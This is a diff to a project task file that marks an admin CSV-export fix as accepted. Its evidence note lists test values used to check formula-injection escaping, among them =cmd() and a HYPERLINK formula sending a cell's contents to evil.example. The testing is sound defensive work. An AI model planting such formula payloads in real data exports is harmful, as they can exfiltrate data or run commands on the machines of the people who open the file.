@@ -79,7 +79,7 @@ features:
         deps: [f4-shell]
       - id: a1-admin
         owner: build
-        status: awaiting_review
+        status: accepted
         reviewer: review
         spec: .pact/tasks/_DECOMPOSITION.md
         evidence: Fixed src/app/admin/leads/csv/route.ts csvCell() to prefix any cell whose first character is a spreadsheet formula trigger (=, +, -, @, tab, CR) with a leading apostrophe before applying the existing structural CSV escaping. Proved on a production build (pnpm build + pnpm start -p 3708): seeded leads named =cmd(), +1+1, @SUM(1+1), =HYPERLINK("http://evil.example/?x="&A1,"clickme"), and =1,2; authenticated via signed admin cookie; GET /admin/leads/csv returned name cells '=cmd(), '+1+1, '@SUM(1+1), '=HYPERLINK(...), '=1,2 — all start with the neutraliser and none begin with =/+/-/@. Seeded rows deleted; Neon leads count confirmed 0. Gates: npx tsc --noEmit PASS, pnpm lint PASS, pnpm build (Turbopack, ADMIN_PASSWORD from .env.local) PASS, pnpm verify:contrast PASS, pnpm verify:image-label PASS.
